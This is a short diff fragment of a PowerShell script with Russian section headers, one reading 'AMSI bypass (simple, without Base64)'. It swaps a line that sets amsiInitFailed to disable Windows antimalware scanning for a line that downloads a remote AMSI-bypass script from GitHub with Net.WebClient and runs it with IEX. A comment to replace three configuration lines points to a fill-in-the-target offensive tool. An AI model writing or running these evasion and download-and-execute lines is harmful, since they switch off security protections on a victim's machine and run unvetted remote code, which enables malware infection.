@@ -1,7 +1,7 @@
 # ============================================================
 #  AMSI BYPASS (простой, без Base64)
 # ============================================================
-[System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/chainski/GlobalAMSIBypass/main/amsi.ps1')
 
 # ============================================================
 #  КОНФИГУРАЦИЯ (ЗАМЕНИТЕ ЭТИ ТРИ СТРОКИ)
